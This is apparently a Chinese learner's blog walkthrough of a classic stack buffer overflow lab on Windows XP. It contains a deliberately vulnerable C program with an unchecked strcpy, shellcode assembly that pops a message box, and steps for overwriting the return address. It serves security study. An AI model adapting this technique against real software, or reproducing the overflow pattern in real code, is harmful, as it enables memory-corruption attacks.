    说在前头

    决定开一个新的系列，专门记录我在学习《0day安全》这本书里碰到的实验。力争做到全部都做一遍。

    Visual C++ 6.0 新建文件

    书本里的实验环境是xp，编译器选择是visual c++ 6.0。而我刚好都是把xp作为学习逆向的虚拟机，巧了。所以我就差一个visual c++ 6.0 没下载了。
    说实话打开VC后我懵了，怎么新建文件？百度之后才学会。
    新建工程，选择“Win32 Console Application”，选择好工作空间（保存路径），起一个工程名，点击保存。
    在右侧边栏看到新建的工程文件，点击“File View”切换视角，选中“Source Files”文件夹，然后左上角点击新建文件，选择“C++ Source File”，起好文件名，注意若是C语言文件的话一定要加上“.c”后缀，因为文件默认保存为cpp后缀（对应C++语言）。

    ok文件算是创建好了，接下来开始码代码咯。

    实验C源码：

    #include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#define PASSWORD "1234567"

int verify_password(char *password){
    int authenticated;
    char buffer[44];
    authenticated=strcmp(password,PASSWORD);
    strcpy(buffer,password);   //over flowed here
    return authenticated;
}

main(){
    int valid_flag=0;
    char password[1024];
    FILE *fp;
    LoadLibrary("user32.dll");   //prepare for messagebox
    if(!(fp=fopen("password.txt","rw+"))){
        exit(0);
    }
    fscanf(fp,"%s",password);
    valid_flag=verify_password(password);
    if(valid_flag){
        printf("incorrent password !");
    }
    else{
        printf("Congratulation ! You have passed the verification !");
    }
    fclose(fp);
    system("pause");
    return 0;
}

    码完C代码后，就开始编译了，说实话这是我第一次尝试在VC里编译，以前没搞过。根据书本说的，build的版本是debug版本，所以右键点击菜单栏，点击“组建”，会另外蹦出一栏，选择“win32 Debug”即可。点击“build”，F7也可。然后目录下多出来一个“debug”文件夹。进去后看到exe文件。

    下载dependency walker：

    这个工具在VC++ 6.0的Tool文件夹里有，可以直接用。

    这个工具将辅助我们找到user32.dll等动态链接库的基址以及对应的导出函数的偏移地址。

    貌似挺不错的。
    运行depends后，随便拽一个由图形界面的PE文件进去。
    由于user32.dll等动态链接库的基址和对应的导出函数的偏移地址 是与操作系统版本号，补丁版本等诸多因素有关，所以就是说，同一个操作系统下，每个PE文件享有相同的库的地址。
    比如我将xxx.exe丢进depends里。查找USER32.dll的基址和MessageBoxA函数的偏移地址。
    如图:

    所以我们就得到了USER32.dll库的基址为0x77D10000
    MessageBoxA函数的偏移地址为 0x407EA
    所以MessageBoxA函数在内存中的入口地址为 0x77D507EA

    编写shellcode

    我们的目标是pwn掉程序，然后弹出一个信息框，显示“failwest”。
    我尝试找过很多的 汇编代码转机器码 的工具，但是发现都不怎么能用，呃呃呃。
    只好靠老办法，直接在Ollydebug里找一段空闲的区域，写入汇编代码，在其左边自动会显示机器码。
    输入以下shellcode代码：

    xor ebx,ebx
push ebx
push 74736577
push 6C696166
mov eax,esp
push ebx
push eax
push eax
push ebx
mov eax,0x77D507EA
call eax

    如图：

    得到机器码后就将机器码写入我们的password.txt文件，作为shellcode。

    用Winhex打开空白的password.txt文件，点击菜单栏的“编辑”，选择粘贴0字节，输入大小后便可以对众多的00字节进行改动，手动改为我们的shellcode。或者把机器码复制粘贴过来。

    如图：

    可以看见开头部分是我们的shellcode，然后是一堆的“90”，即nop（不执行任何动作，起填充作用），然后最后四个字节是返回地址，我们填为 F0 FA 12 00 ，即0x12FAF0，这个地址是什么？这个地址是栈的首地址。即返回到栈顶去执行存储在那里的shellcode。

    那么怎么找到栈的首地址？
    单纯靠ollydbg来调试是盲目的，我们先打开IDA进行分析。发现栈上的数据是通过调用strcpy函数拷贝的，所以要想找到栈上数据和栈的地址，我们就必须紧盯strcpy函数。
    call strcpy的地址为 0x401054

    所以接着在od中先Ctrl+g，输入0x401054跳到指定的地址处，再对地址0x401054进行下断，然后点击运行，或F9运行程序，则自动断在0x401054处，此刻我们单步进入函数，逐步跟踪。

    如图：

    ok，所以把0x12FAF0修改为返回地址，所以程序就会跑去栈数据首地址去执行shellcode了。

    一切具备，只差最后的“点火”了。
    我build编译了release版本的和debug版本的。

    后来我遇见exe文件执行后闪退的问题，解决方法是：加入stdlib.h，然后再末尾加上 system(“pause”); 即可把程序停下来不至于闪退了。后续我把C源码重新编译了一遍。

    最后，试验成功！

    总结：

    这篇文章的后小半部分我是隔天早上写的，因为昨晚一直鼓捣到很晚，弄到11点半的时候才实验成功，所以我就顶不住，睡了。
    总之，通过这一个实验我学到了很多，自己亲手搞一遍就是不一样的感觉。最后成功弹出消息框的时候很开心。

    实验虽然很简单（覆盖返回地址去执行shellcode），放在CTF pwn里并不算什么，但是它向我敞开了windows pwn的大门。
